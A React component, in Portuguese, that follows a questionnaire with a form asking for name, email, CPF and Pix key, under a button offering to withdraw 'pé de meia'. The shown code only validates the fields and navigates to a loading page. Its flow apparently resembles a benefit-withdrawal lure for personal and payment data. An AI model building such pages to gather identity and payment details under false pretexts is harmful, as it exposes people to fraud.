import atendente from '../../images/atendente.png';
import { useState } from "react";
import { useNavigate } from "react-router-dom";

function GetInfos() {
    const [nome, setNome] = useState("");
    const [email, setEmail] = useState("");
    const [cpf, setCpf] = useState("");
    const [pix, setPix] = useState("");

    const navigate = useNavigate();

    function handleContinuar() {
        if (!nome.trim() || !email.trim() || !cpf.trim() || !pix.trim()) {
            alert("Preencha todos os campos");
            return;
        }

        navigate("/loading");

    }

    function formatCPF(value: string) {
        return value
            .replace(/\D/g, "")              // tira tudo que não é número
            .slice(0, 11)                    // limita a 11 dígitos
            .replace(/(\d{3})(\d)/, "$1.$2")
            .replace(/(\d{3})(\d)/, "$1.$2")
            .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
    }



    return (
        <main className="flex flex-col min-h-screen p-4">
            <div className="flex flex-col items-center justify-center bg-[var(--azul-claro)] h-40
        w-40 border-8 border-[var(--azul-escuro)] rounded-full mx-auto mt-7">
                <img src={atendente} alt="Foto Atendente" className="w-30 mt-1" />
            </div>

            <div
                id="messageShadow"
                className="border-1 border-black w-[90%] rounded-2xl absolute top-46 mx-auto left-1/2 
        -translate-x-1/2 px-4 py-2 bg-white"
            >
                <h1 className="text-center font-medium">
                    Que bom que concluiu nosso questionário! <br />
                    Você está quase lá.
                </h1>
            </div>

            <form
                className="mt-19 px-4"
                onSubmit={(e) => {
                    e.preventDefault();
                    handleContinuar();
                }}
            >
                <div className="flex flex-col items-center justify-center">
                    <h2 className="text-xl font-bold mb-4">Preencha seus dados</h2>

                    <div className="w-full max-w-md">
                        <label className="block text-sm font-medium mb-1">
                            Nome Completo
                        </label>
                        <input
                            type="text"
                            value={nome}
                            onChange={(e) => setNome(e.target.value)}
                            className="w-full px-3 py-2 border rounded-md"
                        />
                    </div>

                    <div className="w-full max-w-md mt-4">
                        <label className="block text-sm font-medium mb-1">
                            Email
                        </label>
                        <input
                            type="email"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            className="w-full px-3 py-2 border rounded-md"
                        />
                    </div>

                    <div className="w-full max-w-md mt-4">
                        <label className="block text-sm font-medium mb-1">
                            CPF
                        </label>
                        <input
                            type="text"
                            value={cpf}
                            onChange={(e) => setCpf(formatCPF(e.target.value))}
                            className="w-full px-3 py-2 border rounded-md"
                        />

                    </div>

                    <div className="w-full max-w-md mt-4">
                        <label className="block text-sm font-medium mb-1">
                            Chave Pix
                        </label>
                        <input
                            type="text"
                            value={pix}
                            onChange={(e) => setPix(e.target.value)}
                            className="w-full px-3 py-2 border rounded-md"
                        />
                    </div>

                    <button
                        type="submit"
                        id="btnSacar"
                        className="mt-6 text-[20px] bg-[var(--azul-escuro)] text-white py-2 px-4 rounded-md"
                    >
                        Sacar pé de meia
                    </button>
                </div>
            </form>
        </main>
    );
}

export default GetInfos;
